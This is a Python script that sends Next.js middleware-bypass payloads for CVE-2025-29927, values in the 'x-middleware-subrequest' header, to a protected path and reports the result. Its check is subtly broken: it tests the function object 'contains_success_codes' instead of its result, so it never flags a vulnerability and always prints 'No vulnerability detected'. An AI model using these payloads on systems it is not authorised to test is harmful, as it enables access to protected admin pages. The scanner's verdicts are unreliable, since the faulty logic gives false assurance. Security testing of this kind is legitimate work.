import requests
import argparse


signin_paths = ['/signin', '/login', '/auth/login', '/auth/signin']
register_paths = ['/register', '/auth/register', '/auth/register']

verbose = False
show_headers = False

def print_message(message):
    if verbose:
        print(message)
    
    

def check_url_contains_path(url, paths, type):
    for path in paths:
        if path in url:
            print_message(f"✅ {type} Path {path} found in URL: {url}")
            return True
        
    print_message(f"❌ {type} Path not found in URL: {url}")    
    return False

def contains_success_codes(status_code):
    response = status_code != 302 and status_code <= 400
    
    if not response:
        print_message(f"❌ Status code {status_code} is not a success code")
    else:
        print_message(f"✅ Status code {status_code} is a success code")
    
    return response

def check_nextjs_middleware_vulnerability(url, path):
    """
    Check for Next.js middleware vulnerability (CVE-2025-29927)
    
    Args:
        url (str): Base URL of the Next.js application
        path (str): Protected path to test
    """
    # Configurations to test based on different Next.js versions
    payloads = [
        # For versions prior to 12.2
        'pages/_middleware',
        
        # For versions 12.2 and after
        'middleware',
        'src/middleware',
        
        # For recent versions (recursive payload)
        'middleware:middleware:middleware:middleware:middleware',
        'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
    ]

    print(f"🕵️ Checking {url} for Next.js Middleware Vulnerability (CVE-2025-29927)")

    for payload in payloads:
        try:
            # Send request with custom middleware subrequest header
            headers = {
                'x-middleware-subrequest': payload
            }
            
            # Allow redirects and accept all status codes
            response = requests.get(
                url + path, 
                headers=headers, 
                allow_redirects=True
            )

            print(f"\n🔍 Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Accessed URL: {response.url}")
            
            # Check if accessing a protected path that should have been blocked
            
            contains_success = contains_success_codes(response.status_code)
            contains_login_paths = check_url_contains_path(response.url, signin_paths, "login")
            contains_register_paths = check_url_contains_path(response.url, register_paths, "register")
            
            if not contains_success_codes and not contains_login_paths and not contains_register_paths:
                print(f"🚨 POTENTIAL VULNERABILITY DETECTED with payload: {payload}")
                print('The site might be vulnerable to middleware bypass!')
            else:
                print("✅ No vulnerability detected with payload:", payload)       
                
            if show_headers:
                print("Response Headers:")
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
        
        except requests.RequestException as e:
            print(f"Error testing payload {payload}: {e}")

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(
        description='Check Next.js site for middleware vulnerability (CVE-2025-29927)',
        epilog='IMPORTANT: Only use on sites you own or have explicit permission to test!'
    )
    
    parser.add_argument(
        'url', 
        help='Base URL of the Next.js site (e.g., https://example.com)'
    )
    
    parser.add_argument(
        'path', 
        nargs='?', 
        default='/admin', 
        help='Protected path to test (default: /admin)'
    )
    
    parser.add_argument(
        '-s', 
        '--show-headers',
        action='store_true',
        help='Show response headers (default: False)'
    )
    
    parser.add_argument(
        '-v', 
        '--verbose', 
        action='store_true', 
        help='Enable verbose output'
    )
    
    

    # Parse arguments
    args = parser.parse_args()
    
    if args.verbose:
        global verbose
        verbose = True
        
    if args.show_headers:
        global show_headers
        show_headers = True
    

    # Run vulnerability check
    check_nextjs_middleware_vulnerability(args.url, args.path)

if __name__ == "__main__":
    main()